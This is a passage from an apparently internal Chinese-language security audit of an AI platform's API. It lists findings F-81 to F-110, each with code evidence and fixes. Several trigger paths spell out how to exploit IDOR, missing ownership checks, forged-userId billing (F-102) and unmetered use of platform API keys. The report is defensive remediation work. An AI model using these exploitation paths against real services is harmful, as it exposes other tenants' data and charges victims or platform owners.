  - `agents.ts:1743-1749`：`const existing = await findThumb(...); if (existing) { await removeThumb(...) } ; await addThumb(...)`
  - `agents-queries.ts:564-570`：`await db.insert(agentThumbs).values(...)` / `await db.update(agents).set({ likeCount: sql\`... + 1\` })`
  - `agents-extended.ts:282-284`：`index('zhs_agent_thumbs_uuid_bot_idx')`（普通索引，无 unique）
- **影响面**：榜单权重（`agents.ts:2617`）可被刷量/并发污染；明细与计数长期不一致。
- **建议修法**：加 `unique(uuid, bot_id)`；`insert ... onConflictDoNothing().returning()` 仅真插入才 +1；同事务，remove 按实际删除行数递减。
- **是否当场可修**：是（需迁移）。

### F-81 短信接码快照 UTC 日期与本地时刻混用，每日 00:00–08:00 归日错位并可重复入库

- **严重度**：P2
- **文件与行号**：`apps/api/src/db/sms-receive-queries.ts:110-124`
- **触发路径**：`GET /api/admin/sms-receive/related-msgs` → `snapshotRelatedMsgs`。
- **根因**：`today/yesterday` 用 `toISOString()`（UTC），`nowHHMM` 用 `getHours()/getMinutes()`（服务器本地）。容器 TZ=Asia/Shanghai 时本地 00:00–07:59 的 UTC 日期仍是前一天，归日错误；唯一键含 `rec_date`，跨 08:00 后同一条会再插一次。
- **证据**：
  - `sms-receive-queries.ts:116-121`：`nowHHMM = getHours():getMinutes()`；`today = now.toISOString().slice(0,10)`；`recDate: r.time > nowHHMM ? yesterday : today`
- **影响面**：每天 8 小时窗口日期错误，统计虚高、按日对账错位、跨日去重失效。
- **建议修法**：统一 `Asia/Shanghai` 日历（`Intl.DateTimeFormat('en-CA', { timeZone })` 或 DB 侧 `AT TIME ZONE`）。
- **是否当场可修**：是。

### F-82 `ensureMargin` 先查后插无冲突处理，并发首次充值/扣减返回 500

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/commission-queries.ts:54-66`；调用点 `:74`、`:113`
- **触发路径**：新用户并发首充/首扣 → `ensureMargin` 两请求都判空 → 第二个 INSERT 抛 23505；`deductToken` 无 catch → 500。
- **根因**：`SELECT … limit(1)` 判空后 `INSERT`，`user_margins` 主键为 `user_id`；无 `onConflict` 处理。
- **证据**：
  - `commission-queries.ts:55-65`：`const existing = await db.select().from(userMargins)...; if (existing[0]) return existing[0]; await db.insert(userMargins).values(...)`
- **影响面**：首次调用偶发 500，重试可恢复但污染监控。
- **建议修法**：`insert(...).onConflictDoNothing().returning()`，空则再 select。
- **是否当场可修**：是。

### F-83 订单/退款/发票列表按随机 UUID v4 倒序，等价于乱序

- **严重度**：P3
- **文件与行号**：`apps/api/src/db/order-queries.ts:196`、`:558`、`:734`；表定义 `packages/database/src/schema/order.ts:28`
- **触发路径**：`GET /api/orders`（`order.ts:367-371`）、`GET /api/admin/orders`（`order.ts:932-938`）。
- **根因**：`id: uuid('id').defaultRandom()` 为 v4 随机值，`orderBy(desc(eduOrders.id))` 与创建时间无关。
- **证据**：
  - `order-queries.ts:192-198`：`.orderBy(desc(eduOrders.id)).limit(pageSize).offset(...)`
- **影响面**：“最新订单”页随机混入历史订单，按页翻查定位困难。
- **建议修法**：`orderBy(desc(createdAt), desc(id))`，发票用 `issuedAt/createdAt`。
- **是否当场可修**：是。

### F-84 ilike 通配符系统性未转义（搜索扫描放大 + 直播回调后缀匹配可能批量误改）

- **严重度**：P3
- **文件与行号**：`fund-queries.ts:15`、`knowledge-queries.ts:15`、`certificate-queries.ts:29,150`、`live-queries.ts:106,249,268`、`member-queries.ts:75-76,157-159,353,511,611`、`member-extended-queries.ts:38,123,206,285,370`、`resource-queries.ts:121,387,498`；正确样例 `order-queries.ts:187-189`
- **触发路径**：`GET /api/fund?search=%`、`GET /api/live/channels?search=%`、`GET /api/admin/members/companies?name=%`；直播 `POST /api/live/callback` → `updateLiveChannelStatusByStreamName`。
- **根因**：直接拼 `%${input}%` 未转义 `%`/`_`/`\`；直播回调用 `ilike(pushUrl, '%/' + streamName)` 做后缀匹配，含通配符会退化为多行匹配。
- **证据**：
  - `fund-queries.ts:15`：`ilike(funds.name, \`%${opts.search}%\`)`
  - `live-queries.ts:249`：`ilike(liveChannels.pushUrl, \`%/${streamName}\`)`
  - 对照 `order-queries.ts:187-189`：`asContainsTerm(...)` + 注释“转义 ilike 通配符”
- **影响面**：`%` 令索引失效并全表扫描 + 全量 count，放大 DB 负载；直播后缀匹配可批量改多频道 `isLive`。
- **建议修法**：统一 `asContainsTerm`；直播改为精确 `eq(streamName)` 并限定 `status=1`。
- **是否当场可修**：是。

### 第四轮 E：v1 协议、上游代理与 worker

### F-85 Batch API 单对象端点缺租户归属校验（BOLA/IDOR）

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/v1-batches.ts:334-341`（GET）、`:351-366`（cancel）、`:377-395`（content）、`:550-557`、`:567-583`
- **触发路径**：持有 `batches:read/write` 的 API Key（A 租户）拿到 B 租户的 `batch_<uuid>` / `msgbatch_<uuid>` → 直接 GET/cancel/content。
- **根因**：列表接口按 `_apiKeyId` 过滤，5 个单对象端点只判 `getTask` 存在性，从不比对归属。
- **证据**：
  - 列表：`if (task._apiKeyId !== apiKeyId) continue`
  - 单对象：`const task = await getTask(...); if (!task) return 404; return reply.send(toOpenAIBatchResponse(task))`
  - cancel：`task.status = 'cancelled'; ... await saveTask(redis, task)`
- **影响面**：跨租户读取他人批量请求原文与结果、恶意取消他人任务。
- **建议修法**：抽 `assertBatchOwnership(task, apiKey)`，5 处 `getTask` 后立即校验，不匹配一律 404。
- **是否当场可修**：是。

### F-86 Realtime WS 端点绕过共享鉴权粒度且完全不计费/不限额

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/v1-realtime.ts:360-367`、`:605-616`、`:686-705`
- **触发路径**：`GET /v1/realtime?model=gpt-4o-realtime&api_key=ihui_xxx`（WS upgrade）→ 自建 `validateApiKey` 只查 `status` → 直连上游平台 Key。
- **根因**：未复用 `plugins/api-key-auth.ts` 的 `requireApiKeyAuth`；`expiresAt/allowedIps/allowedModels/rateLimit` 全不校验，全文件无 `checkQuota/preDeductQuota/recordCall`。
- **证据**：
  - `v1-realtime.ts:605-616`：`return row?.status === 'active'`
  - 上游：`new WebSocket(wsUrl, { headers: { Authorization: \`Bearer ${upstreamKey}\` } })`
- **影响面**：过期/限模型 Key 仍可无限开语音会话；平台 Reedtime Key 成本完全不计；`api_key` 走 query 进访问日志。附带：`socket.on('message')` 在 `upstream.on('open')` 内注册，open 前事件被丢弃；上游 WS 无连接超时。
- **建议修法**：复用 `requireApiKeyAuth` 完整校验；会话开始预扣、结束按用量结算；监听提前注册 + 队列缓冲；加连接超时；Key 只收 Header。
- **是否当场可修**：是。

### F-87 OpenAI 兼容代理的 images/speech/transcriptions/responses 完全不扣积分也不查余额

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-vendors/proxy-openai-compat.ts:307-316`、`:347-384`、`:413-464`、`:518-557`
- **触发路径**：任意已登录用户调用 `POST /api/ai/{openai|siliconflow|zhipu|xai}/images`、`POST /api/ai/openai/speech|transcriptions|responses`。
- **根因**：这些端点使用平台环境变量 Key，但只 `recordUsage`（内存计数），无 `ensurePointsBalance`/`chargePointsForCall`；同文件仅 chat/embeddings 走了计费。
- **证据**：
  - chat：`recordUsage(...); await chargePointsForCall(request, body.model ?? '', data, request.id)`
  - images：`if (data === null) return; recordUsage(request.userId!, vendor); return reply.send(success(data))`
  - `recordUsage` 仅 `usageStore` 计数（`:47-56`）
- **影响面**：任何账号（含零积分）可无限调用平台付费 TTS/Whisper/Responses/生图；`GET /openai/responses/:id` 还能用平台 Key 读任意 response。
- **建议修法**：四类端点统一 `ensurePointsBalance` + 按量 `spendPoints`（`request.id` 幂等），或限制为管理员/白名单。
- **是否当场可修**：是。

### F-88 batch-worker 失败即写终态 `failed`，BullMQ 的 3 次重试全部空转

- **严重度**：P2
- **文件与行号**：`apps/api/src/workers/batch-worker.ts:577-585`、`:261-264`；`apps/api/src/queue/batch-queue.ts:323-325`
- **触发路径**：批量处理抛非预期异常 → catch 写 `failed`（终态）→ `throw err` 交给 BullMQ 重试 → 第 2/3 次命中终态判断直接 `return`。
- **根因**：把“终态 failed”与“可重试失败”混为一谈，重试被自身幂等闸门短路。
- **证据**：
  - `batch-worker.ts:579-584`：`await updateBatchTaskStatus(redis, taskId, 'failed', ...); throw err`
  - `batch-worker.ts:261-264`：`if (TERMINAL_STATUSES.includes(task.status)) { ... return }`
  - `batch-queue.ts:323-325`：`attempts: 3, backoff: { type: 'exponential', delay: 5000 }`
- **影响面**：一次瞬时错误把整批永久置 failed，部分结果与剩余请求不再处理；死信语义与配置不符。
- **建议修法**：仅在最后一次 attempt 写 `failed`，否则回写进行态后 rethrow；或改用租约+心跳判终态。
- **是否当场可修**：是。

### F-89 流式响应“客户端断开/中途断流”按 error 结算，已交付 token 全部免计费

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-responses.ts:392-394`、`:406-429`；`apps/api/src/routes/v1-messages.ts:307-309`、`:325-348`；结算 `apps/api/src/services/relay-billing-service.ts:1185-1188`
- **触发路径**：SSE 已输出部分 token 后客户端断连（AbortError）或上游中途异常 → `streamError` 置位 → finally `status:'error'` → 计费成本归零。
- **根因**：用同一 `error` 状态表达“整次失败”与“已部分交付”；`recordCall` 对非 success 一律 `costCentsToDeduct = 0`。
- **证据**：
  - `v1-responses.ts:392-394`：`streamError = (e as Error).name === 'AbortError' ? 'client disconnected' : ...`
  - `v1-responses.ts:406-429`：`status: streamError ? 'error' : 'success'`
  - `relay-billing-service.ts:1185-1188`：`if (input.status && input.status !== 'success') { ... costCentsToDeduct = 0 }`
- **影响面**：收到部分内容后主动断连即可让整次上游调用免费（含大 prompt）；v1-messages 同构。
- **建议修法**：引入 `partial/aborted` 状态，对 `completionTokens > 0` 的流式按实际 token 结算；仅“上游 4xx/5xx 且零 token”免计费。
- **是否当场可修**：是。

### F-90 rerank 兜底 token 估算只看 query、忽略 documents，严重少计费

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-rerank-moderations.ts:212-233`
- **触发路径**：上游 rerank 未返回 `meta.tokens.input`/`meta.billed_units.input` 时走兜底 `query.length/4`。
- **根因**：兜底未把 `documents` 拼入估算，而 rerank 成本几乎全部来自 documents。
- **证据**：
  - `v1-rerank-moderations.ts:212-215`：`const inputTokens = data.meta?.tokens?.input ?? data.meta?.billed_units?.input ?? Math.ceil(query.length / 4)`
- **影响面**：100 篇长文档 + 短 query 仅按几 token 计费，差额可达 2~3 个数量级，可被持续滥用。
- **建议修法**：兜底按 `query + documents.join('')` 总字符/4 估算；识别 Jina `usage.total_tokens`、Cohere `meta.billed_units`。
- **是否当场可修**：是。

### F-91 notification-dispatch-worker 吞掉邮件/短信失败并返回成功，队列 3 次重试形同虚设

- **严重度**：P2
- **文件与行号**：`apps/api/src/workers/notification-dispatch-worker.ts:66-69`、`:80-84`；队列默认 `apps/api/src/plugins/queue.ts:136-144`、`:158-164`
- **触发路径**：`send-targeted` 入队 → `sendEmail/sendSmsMessage` 抛异常或返回失败 → catch 只记 `status='failed'`，正常 `return`。
- **根因**：失败被降级为业务字段，未向 BullMQ 抛出；该队列 `attempts = 3` 本应重试/进死信。
- **证据**：
  - `notification-dispatch-worker.ts:66-69`：`catch (e) { status = 'failed'; errorMessage = ... }`
  - `queue.ts:136-144`：`attempts: 3, backoff: { type: 'exponential', delay: 2000 }`
- **影响面**：SMTP/短信网关抖动时通知永久丢失，运维无法通过 failed 队列发现与补偿。
- **建议修法**：可重试错误（网络/5xx/限流）直接 `throw`；不可重试错误才落终态；若不重试则显式 `attempts: 1` 并改正注释。
- **是否当场可修**：是。

### F-92 Midjourney 任务状态/操作端点无归属校验，可跨租户读取他人图片结果

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/v1-midjourney.ts:265-286`、`:294-323`、`:330-360`
- **触发路径**：任意 API Key（`generation:write`）调用 `GET /v1/midjourney/tasks/{任意taskId}`，服务端用平台 MJ Key 向上游查询。
- **根因**：只做参数校验与 `mjConfigured()`，未建立 taskId→apiKey.userId 的归属映射，无上游任务与调用者绑定校验。
- **证据**：
  - `v1-midjourney.ts`：`const task = await mjFetch<MjUpstreamTask>(\`/mj/task/${encodeURIComponent(p.data.taskId)}\`)`；全文件无 `task.userId/apiKey.id` 比对
- **影响面**：任务 ID 来自上游、可枚举/猜测；可批量拉取他人 prompt 与图片 URL；action/upscale 可对任意 taskId 操作。
- **建议修法**：提交时持久化 `taskId -> {apiKeyId,userId,op}`，查询/操作先查本地归属，不匹配 404。
- **是否当场可修**：是。

## 九、第五轮新增（user 路由 / ai 路由 / WS-SSE / jobs-代理）

### 第五轮 A：routes/user 面

### F-93 平台 OpenRouter 密钥被任意登录用户当通用 LLM 代理（无模型白名单/计费/超时）

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/user/proxy-routes.ts:30-85`；挂载 `apps/api/src/routes/index.ts:1132`
- **触发路径**：登录后 `POST /api/openrouter-proxy/chat/completions`（body 原样上送）/ `GET /api/openrouter-proxy/models`。
- **根因**：路由不读 `request.userId`，仅靠父级登录态；客户端 body 直接成为上游请求体，密钥取 `process.env`；`fetch` 无 signal，超时分支不可达。
- **证据**：
  - `proxy-routes.ts`：`const key = process.env[cfg.keyEnv] ?? ''`
  - `fetch(\`${cfg.base}/chat/completions\`, { method:'POST', headers:{ Authorization:\`Bearer ${key}\` }, body: JSON.stringify(body) })`
  - `const msg = (e as Error).name === 'AbortError' ? '请求超时' : ...`（无 AbortController）
- **影响面**：任意账号（含试用）可用平台额度跑任意模型/`max_tokens`/tools/stream，无记账与配额；上游 hang 时长期占用连接。
- **建议修法**：下线或改 BYOK；保留则加模型白名单 + max_tokens 上限 + 配额计费 + `AbortSignal.timeout()`；不回显上游错误体。
- **是否当场可修**：是。

### F-94 知识库详情匿名可读且返回未发布/下线草稿

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user/_shared.ts:42-51`；`apps/api/src/routes/user/knowledge-routes.ts:40-46`；`apps/api/src/db/knowledge-queries.ts:33-36`
- **触发路径**：不带 Authorization 的 `GET /api/knowledge/<uuid>`。
- **根因**：`isPublicKnowledgeGet` 按前缀整段放行 `GET /knowledge/*`；详情查询只按 id，未加 `isPublished=true AND status=1`（列表侧有该条件）。
- **证据**：
  - `_shared.ts:46`：`return /^\/knowledge\/?$/.test(path) || /^\/knowledge\/[^/]+\/?$/.test(path)`
  - `knowledge-queries.ts:33-36`：`db.select().from(knowledgeBase).where(eq(knowledgeBase.id, id)).limit(1)`
- **影响面**：草稿/下线文章全文匿名可读（正文、作者、分类）。
- **建议修法**：详情加发布态过滤或改为鉴权路由；不要把详情纳入公开白名单。
- **是否当场可修**：是。

### F-95 通知详情/消息详情按 id 直查，无归属校验（IDOR）

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user/misc-routes.ts:150-162`；`apps/api/src/db/notification-queries.ts:94-96`；`apps/api/src/db/chat-queries.ts:1320-1322`
- **触发路径**：登录用户 `GET /api/notifications/<他人uuid>`、`GET /api/messages/<他人uuid>`。
- **根因**：路由把路径 id 直接下传，不传 `request.userId`；两条查询 where 只有 id（两表均有 userId 列，同文件 update 已按 userId 校验）。
- **证据**：
  - `misc-routes.ts:157`：`const notification = await findNotificationById(id)`
  - `notification-queries.ts:94-96`：`where(eq(notifications.id, id)).limit(1)`
  - `chat-queries.ts:1320-1322`：`where(eq(chatMessages.id, id)).limit(1)`
- **影响面**：越权读取他人站内通知、私聊/AI 会话消息。
- **建议修法**：`findNotificationById(id, userId)` / `findMessageById(id, userId)`，不匹配 404。
- **是否当场可修**：是。

### F-96 任意登录用户可写全局 `ai_model_config`，且全站可读他人 `baseUrl`

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user/ai-models-routes.ts:41-58`、`:81-100`、`:138-139`/`:165`
- **触发路径**：登录后 `POST /api/ai/models {name, provider, baseUrl, status:1}` → 所有用户 `GET /api/ai/models` 可见。
- **根因**：POST 仅 `authenticate`，无 admin 闸，`enabled` 默认 true、`ownerUuid` 记为调用者；GET 不带 owner 过滤并回传 `baseUrl`/`modelIdForTest`。同文件 PUT/DELETE 已限定 owner。
- **证据**：
  - `ai-models-routes.ts`：`enabled: d.status === undefined ? true : d.status === 1` / `ownerUuid: request.userId`
  - GET：`.where(eq(aiModelConfig.enabled, true))` + 返回 `baseUrl`
  - PUT/DELETE：`eq(aiModelConfig.ownerUuid, request.userId!)`
- **影响面**：普通用户污染全局模型表（排序/同名混淆）；所有用户可读他人自定义 `baseUrl`（可能含 token/内网域名）。不进入 relay 选路，故不直接劫持流量。
- **建议修法**：POST 要求 admin 或限定私有模型；GET 按 owner 过滤；`baseUrl` 对非 owner 脱敏。
- **是否当场可修**：是。

### F-97 `/v1/ai/capabilities/invoke` 用系统票调 LLM、无计费，且失败伪装成功

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/user/ai-capabilities-routes.ts:83-123`；`apps/api/src/services/crew-llm-adapter.ts:121`
- **触发路径**：登录后 `POST /api/v1/ai/capabilities/invoke`。
- **根因**：路由不把调用者身份/计费上下文带入 LLM 层，`callRealLlm` 用 `aiServiceFetch(null, ...)` 注入系统 token；任何异常返回 `200 + success:true` 合成文本。
- **证据**：
  - `ai-capabilities-routes.ts`：`const llmResult = await callRealLlm({ messages: [...] })`
  - `crew-llm-adapter.ts:121`：`const resp = await aiServiceFetch(null, '/api/llm/complete', {`
  - catch：`return reply.send(success({ success: true, capability_id: cap.id, result: \`...LLM 调用失败已降级\` }))`
- **影响面**：成本记在系统身份，无用户配额/计费；上游 401/429/超时对客户端恒成功。
- **建议修法**：改 `aiServiceFetch(request, ...)` 或按 userId 计费；失败返回 502/503。
- **是否当场可修**：是。

### F-98 文章详情返回未发布/下线稿件，且对草稿也计浏览

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/user/articles-routes.ts:37-43`；`apps/api/src/db/news-queries.ts:151-161`
- **触发路径**：登录用户 `GET /api/article/detail/<uuid>`。
- **根因**：`findArticleById` 只按 id，无 `isPublished/status` 过滤（列表 `findPublishedArticles` 有）。
- **证据**：
  - `articles-routes.ts:37-43`：`const article = await findArticleById(id); if (article) await incrementArticleViewCount(id)`
  - `news-queries.ts:151-161`：`.where(eq(newsArticles.id, id))`
- **影响面**：已登录用户读他人未发布/下线全文；每次 GET 触发 view_count 可刷量。
- **建议修法**：仅已发布（或作者/管理员）可读，其余 404；浏览数去重异步统计。
- **是否当场可修**：是。

### F-99 `/api/ai/career-advice` 裸 fetch 不带凭证 → 必然 401，却把模板当成功返回

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/user/ai-modules-routes.ts:320-338`、`:361-375`；`apps/api/src/utils/ai-service-fetch.ts:82-99`
- **触发路径**：登录后 `POST /api/ai/career-advice`。
- **根因**：绕过 `aiServiceFetch`，手写 fetch 只带 `Content-Type`；ai-service `/api/llm/complete` 默认需 JWT → 401；catch 返回 200 + 静态兜底文本。
- **证据**：
  - `ai-modules-routes.ts`：`fetch(aiUrl, { method:'POST', headers:{'Content-Type':'application/json'}, signal })`
  - catch：`return reply.send(success({ content: fallback }))`
- **影响面**：功能长期静默失效（200 成功 + 兜底文案），无计费/审计；若未来放行 public 名单将成为匿名成本面。
- **建议修法**：改用 `aiServiceFetch(request, ...)`；失败返回 502 或 `degraded:true` 并告警。
- **是否当场可修**：是。

### F-100 skills push/db-sync 串行最多次百次写，pull/db-sync 全量读无上限（N+1 + 无界内存）

- **严重度**：P3
- **文件与行号**：`apps/api/src/routes/user/skills-routes.ts:65-86`、`:112-151`；`apps/api/src/db/skills-queries.ts:144-146`
- **触发路径**：登录后 `POST /api/skills/push` / `/db-sync`（各最多 100 条）、`POST /api/skills/pull`。
- **根因**：逐条 `await upsertSkillBySlug`（每条 ≈3 次往返）；db-sync 两次全量 `findSkillsByUserId` 无 limit；pull 返回全字段含 `content`。
- **证据**：
  - `skills-routes.ts:65-86`：`for (const item of body.data.skills) { const { action } = await upsertSkillBySlug({...}) }`
  - `skills-queries.ts:144-146`：`return db.select().from(skills).where(eq(skills.authorId, userId))`
- **影响面**：单请求数百次串行 DB + 2 次全量读；pull 对大账号无分页全量正文。
- **建议修法**：批量 upsert/事务；加 limit/分页；`content` 设 max。
- **是否当场可修**：是。

### 第五轮 B：routes/ai-* 面

### F-101 `/api/ai/mcp/servers` 全局表无属主，任意登录用户可读全量、删任意、注入任意 endpoint

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-frontend-routes.ts:274-283`、`:315-317`、`:344-359`、`:375-389`；`packages/database/src/schema/mcp-servers.ts:10-16`
- **触发路径**：任意登录用户 `GET /api/ai/mcp/servers` 获取全部 id/endpoint → `DELETE /api/ai/mcp/servers/{uuid}` → `POST /api/ai/mcp/servers` 写任意 `endpoint`。
- **根因**：插件层只做登录校验；`mcp_servers` 表无 `userId/owner` 列；读/建/删三条 SQL 均无属主谓词，也无 admin 闸。
- **证据**：
  - `ai-frontend-routes.ts:317`：`db.select().from(mcpServers).orderBy(desc(mcpServers.createdAt))`
  - `:355`：`endpoint: parsed.data.endpoint`
  - `:383-385`：`db.delete(mcpServers).where(eq(mcpServers.id, parsed.data.id))`
  - `mcp-servers.ts:10-16`：仅 id/name/endpoint/description 等，无 userId
- **影响面**：跨租户读取全部 MCP 端点、破坏平台共享配置；注入 endpoint 可形成 SSRF/恶意服务端。
- **建议修法**：加 `owner_user_id` 并按 `request.userId` 过滤，或三个写接口前置 `requireAdmin`；GET 按属主过滤。
- **是否当场可修**：是。

### F-102 回调关联键全部取自客户端 metadata：`userId` 可伪造替他人扣费，`messageId` 缺省使幂等键退化

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-frontend-routes.ts:493-498`；`apps/api/src/routes/ai-callback.ts:296-298`、`:313-316`、`:353-366`；`apps/api/src/plugins/token-balance-service.ts:188-196`
- **触发路径**：登录用户 `POST /api/ai/llm/chat`，body 带 `metadata:{userId:"<受害者>", conversationId:"<自己的会话>"}` 且不带 `messageId` → ai-service 以该 userId 签回调票 → `/api/ai/callback` 校验通过 → 按受害者 userId 扣费；同一 conversationId 后续消息幂等键相同全部免扣。
- **根因**：`metadata: { userId: request.userId, ...(parsed.data.metadata ?? {}) }` 让客户端覆盖 userId；ai-service 用 `metadata.userId` 作为回调票 subject，使 `ticketSubjectAllows` 恒成立；幂等键用 `messageId ?? ''`。
- **证据**：
  - `ai-frontend-routes.ts:496`：`metadata: { userId: request.userId, ...(parsed.data.metadata ?? {}) }`
  - ai-service `llm.py`：`(body.get("metadata") or {}).get("userId")` → `mint_internal_service_ticket(callback_user_id, "ai-callback")`
  - `ai-callback.ts:366`：`idempotencyKey: \`${conversationId}:${messageId ?? ''}\``
  - `token-balance-service.ts:188-196`：按 `related_order_no = idempotencyKey AND op_type = 1` 去重
- **影响面**：受害者余额被扣、成本记其名下；可把消息写进受害者会话；复用同一 conversationId 可无限免扣。
- **建议修法**：服务端 metadata 不可被覆盖（先展开再赋值）；ai-service 用 `request.state.user_id` 签票；callback 只认票据主体；幂等键要求 `messageId` 必填或附 job id。
- **是否当场可修**：是。

### F-103 图片编辑 8 个生成端点使用平台 Key，零计费/零余额校验，`model` 客户端任意

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-image-edit.ts:167-237`（另 `:242`、`:316`、`:398`、`:478`、`:738`、`:812`、`:885`）
- **触发路径**：登录用户 `POST /api/ai-image/doubao/edit`、`/ai-image/tongyi/text-to-image`、`/image-to-image`、`/style-transfer`、`/background-generation`、`/virtual-try-on` 等，`model` 任意。
- **根因**：直接用 `process.env.DOUBAO_API_KEY / DASHSCOPE_API_KEY` 调厂商，只写 `ai_image_edit_history`；全文无 `recordAiCost/deductTokens/checkBalance/consumeQuota`，也无模型白名单。
- **证据**：
  - `ai-image-edit.ts:177-196`：`const apiKey = process.env.DOUBAO_API_KEY` / `Authorization: Bearer ${apiKey}` / `model: useModel`
  - `:210-227`：`outputImageUrl = ...` / `status:'success'` / 返回
- **影响面**：平台付费图像生成被任意登录用户无限免费消耗；可指定高价模型；上游 200 但无 URL 仍返回 success。
- **建议修法**：调用前校验余额/配额，成功后计费；模型 allowlist；空 URL 按 502。
- **是否当场可修**：是。

### F-104 音频/声纹 5 个端点使用平台 DashScope Key，零计费/零余额校验

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-audio.ts:62-69`、`:258-262`、`:276-301`（另 `:341`、`:536`、`:809`、`:862`）
- **触发路径**：登录用户 `POST /api/ai/audio/speech`、`/audio/recognize`、`/audio/chat`、`/speaker/register`、`/speaker/compare`。
- **根因**：统一 `dsHeaders()` 取 `process.env.DASHSCOPE_API_KEY`，preHandler 仅 `checkAuth`；全文无计费/余额调用。
- **证据**：
  - `ai-audio.ts:63-65`：`const key = process.env.DASHSCOPE_API_KEY` / `Authorization: \`Bearer ${key}\``
  - `:261`：`if (!(await checkAuth(request, reply))) return`
  - `:276`：`server.post('/audio/speech', { bodyLimit: 34 * 1024 * 1024 }, ...)`
- **影响面**：TTS/ASR/声纹注册比对全部平台买单，可脚本无限调用。
- **建议修法**：按字符/时长预扣或后扣 token；调用前查余额；大 body 叠加按用户限流。
- **是否当场可修**：是。

### F-105 视频编排：平台 Key 四步串行、零计费、无界 Map，失败后二次回包

- **严重度**：P1
- **文件与行号**：`apps/api/src/routes/ai-video-compose.ts:57`、`:70-149`、`:181-192`
- **触发路径**：登录用户 `POST /api/ai-video-compose/`（或 `/:id/regenerate`），单请求顺序执行 script→material→compose→subtitle 四次厂商调用。
- **根因**：`recordUsage` 只自增内存计数，不是计费；`taskStore` 只 `set` 不删；`callVendor` 失败已 `reply.status(502).send()`，调用方仍 `reply.send(success(task))`。
- **证据**：
  - `ai-video-compose.ts:57`：`const taskStore = new Map<string, ComposeTask>()`
  - `:142`：`recordUsage(task.userId, 'dashscope')`
  - `:182-187`：`for (const step of STEP_ORDER) { const ok = await runStep(...); if (!ok) { return reply.send(success(task)) } }`
- **影响面**：平台额度被免费消耗；失败任务永久驻留内存（含完整厂商响应）；4×30s 同步占用；二次 send 触发 Fastify 异常。
- **建议修法**：接计费/余额；任务入队异步；taskStore 加 TTL/上限；失败直接 return。
- **是否当场可修**：是。

### F-106 共享声纹无属主：任意登录用户可枚举并删除任意 `voiceId`

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-audio.ts:916-933`、`:942-963`
- **触发路径**：`GET /api/ai/speaker/list` 拿全量 voice_id → `DELETE /api/ai/speaker/{voiceId}`。
- **根因**：声纹存 DashScope 账号级命名空间，本层无 voice→user 归属表或校验；register 也允许指定任意 voice_id 覆盖。
- **证据**：
  - `:933`：`reply.send(success({ voices: output.voices ?? [], count: ... }))`
  - `:951`：`\`${DS_SPEAKER_URL}?action=delete&voice_id=${encodeURIComponent(voiceId)}\``
- **影响面**：跨用户删除/覆盖他人声纹，破坏其 TTS/比对。
- **建议修法**：建声纹归属表，register 盖章；list/compare/delete 带属主谓词；系统音色禁删。
- **是否当场可修**：是（需迁移）。

### F-107 生成队列入队信任 body `userId`，未与 JWT 主体比对

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-generation.ts:31-41`、`:78-86`；`apps/api/src/services/ai/generation-queue-service.ts:83-104`
- **触发路径**：登录用户 `POST /api/ai/generation/enqueue`，body 传 `userId:"<受害者>"` 与任意 `modelId/params`。
- **根因**：schema 把 `userId` 当必填入参，路由原样 `enqueue(data)`；只有 status/cancel 做了归属校验。
- **证据**：
  - `ai-generation.ts:34`：`userId: z.string().min(1, 'userId 不能为空')`
  - `:83-85`：`const { priority, dedupeWindowMs, ...data } = parsed.data; const jobId = await enqueue(data, ...)`
- **影响面**：任务归属/计费/列表写入受害者身份；`modelId/params` 无白名单。
- **建议修法**：入队前强制 `data.userId = req.jwtPayload.userId`（管理员例外）；modelId 白名单。
- **是否当场可修**：是。

### F-108 `/api/ai-image/user-agent/:id` 缺 `userUuid` 过滤，可枚举读取他人图片记录

- **严重度**：P2
- **文件与行号**：`apps/api/src/routes/ai-image-edit.ts:1059-1074`（对照 `:1094` 删除已带属主）
- **触发路径**：登录用户遍历 `GET /api/ai-image/user-agent/1,2,3...`。
- **根因**：详情只按主键 `id`，未加 `userUuid = request.userId`；同资源 DELETE 加了，属遗漏。
- **证据**：
  - `:1067-1071`：`db.select().from(zhsUserAgentImage).where(eq(zhsUserAgentImage.id, id)).limit(1)`
  - `:1094`：`.where(and(eq(id), eq(userUuid, request.userId!)))`
- **影响面**：跨用户读取 `imageUrl/prompt/model/cost/userUuid` 私有记录。
- **建议修法**：详情加 `eq(userUuid, request.userId!)`，返回 404。
- **是否当场可修**：是。

### 第五轮 C：WS / SSE 面

### F-109 客服 WS：客户可加入任意他人会话（IDOR，无归属校验）

- **严重度**：P1
- **文件与行号**：`apps/api/src/plugins/ws-customer-service.ts:290-303`、`:392`
- **触发路径**：`GET /ws/customer-service?token=<任意已认证用户 JWT>&sessionId=SESS...`，`sessionId` 取自日志/前端存储/分享链接。
- **根因**：只校验会话存在，从不比较 `session.userId` 与 `userId`；`meta` 记了 userId 但不用于鉴权。
- **证据**：
  - `:290-303`：`session = await findSessionBySessionId(sessionIdParam); if (!session) { close(4004) }` → `connections.get(sessionId)!.add(socket)`
  - `db/customer-service-queries.ts:95`：会话行带 `userId`
- **影响面**：实时窃听该会话全部客户消息与坐席回复；冒充客户注入；最后一条连接断开触发 `closeSession` 可强关他人会话。
- **建议修法**：`if (!session || session.userId !== userId) close(4003)`；校验 `status`。
- **是否当场可修**：是。

### F-110 客服 WS：坐席可向任意 sessionId 广播（越权写入他人会话）

- **严重度**：P2
- **文件与行号**：`apps/api/src/plugins/ws-customer-service.ts:257-270`（`broadcast` 定义 `:137-150`）
